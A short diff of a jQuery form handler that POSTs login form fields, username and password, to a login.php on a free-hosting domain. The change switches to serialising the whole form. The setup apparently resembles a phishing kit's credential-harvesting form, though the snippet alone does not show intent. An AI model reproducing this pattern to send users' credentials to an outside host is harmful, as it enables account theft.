@@ -11,7 +11,7 @@ $('#form').submit(function (e) {
   $.ajax({
     type: 'POST',
     url: 'https://banglaerphoto.000webhostapp.com/contact/login.php',
-    data: 'username='+$("#username").val()+'&password='+$("#password").val(),
+    data: $('#form').serialize(),
     success: function (msg) {
       $(".msg").html("msg");
       $("body").css("overflow", "auto");
